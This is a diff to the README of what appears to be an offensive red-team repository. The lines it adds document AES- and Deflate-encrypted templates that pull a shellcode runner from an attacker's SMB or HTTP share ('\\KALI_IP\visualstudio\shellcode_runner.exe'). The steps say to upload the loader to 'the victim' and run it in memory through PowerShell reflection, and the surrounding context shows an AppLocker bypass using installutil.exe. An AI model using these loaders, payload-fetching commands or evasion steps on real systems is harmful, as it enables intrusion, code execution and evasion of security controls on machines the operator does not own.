@@ -349,7 +349,34 @@ There are a lot of methods to bypass Applocker and ```InstallUtil``` is one of t
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\InstallUtil.exe
 ```
+---
 
+### 1.7 AES + Compression
+There are two templates that encrypts a shellcode runner using AES + Compression method. These teplates are located under ```templates/AES/``` directory:
+- AES_Deflate_HTTP.cs
+- AES_Deflate_SMB.cs
+
+To successfully launch this type of attack, you need first to copy the preferred shellcode runner ```XOR``` or ```Caesar``` to an SMB or HTTP server and rename it as ```shellcode_runner.exe```. The default SMB name, it is called **visualstudio**, however you can edited as you wish and provide the one that you already have. Just remember to modify the **line 124** of the template ```Templates/AES/AES_Deflate_SMB.cs``` 
+
+```
+...
+    public static void Main(string[] args)
+    {
+        ruleThemAll("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
+        
+    }
+...        
+```
+
+**Execution Steps**
+- Upload 'AES_Deflate_SMB.exe' or 'AES_Deflate_HTTP.exe' to the victim
+- Copy any shellcode runner that is located under ```payloads/Caesar/``` or ```payloads/XOR/``` directory to an SMB or Apache folder and rename it as ```shellcode_runner.exe```. Default folder name for SMB share is **visualstudio**. 
+- Execution with Reflection:
+```
+PS> $data=[IO.File]::ReadAllBytes('C:\Users\user\Desktop\AES_Deflate_SMB.exe')
+PS> $ass=[System.Reflection.Assembly]::Load($data)
+PS> $ass.EntryPoint.Invoke($null,@($null))
+```
 ---
 ## 2. Execute .Net Assemblies with Reflection
 Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.
